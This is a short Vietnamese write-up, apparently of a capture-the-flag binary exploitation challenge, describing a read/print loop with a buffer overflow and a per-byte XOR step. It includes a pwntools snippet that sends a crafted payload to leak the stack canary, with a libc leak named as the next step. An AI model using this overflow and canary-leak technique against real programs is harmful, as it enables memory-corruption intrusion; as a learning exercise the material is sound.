# Phân tích code

<img width="712" height="450" alt="Screenshot 2026-10-25 164548" src="https://github.com/user-attachments/assets/f3383ac6-f5ab-4d96-a899-5e820fa85b5e" />

Chương trình này sẽ lặp lại `read` và `print` buf đến khi buf rỗng hoặc chỉ có chuỗi exit. Đồng thời có lỗ hổng *buffer overflow* ở hàm `read`.

Lưu ý sau khi read thì chương trình sẽ xor tất cả các BYTE trong buf theo nguyên tắc: BYTE hiện tại xor với BYTE liền kề sau.

xor so sánh các BITS: Khác nhau => 1  ngược lại giống nhau => 0

    0101 0001
    
    0001 1001
    
    0100 1000


<img width="892" height="282" alt="image" src="https://github.com/user-attachments/assets/c71b4ab4-cc74-493d-bb2c-b4dff57c3052" />

Dựa trên trạng thái các cơ chế bảo vệ của chương trình thì trước tiên sẽ cần leak `Canary` và `Libc base`. 

    payload=b'U*'*12+b'U'
    p.sendafter(b'Input: ',payload)
    p.recvuntil(b'U')
    canary=u64(b'\x00'+p.recv(7))
    log.info('canary: '+(hex(canary)))

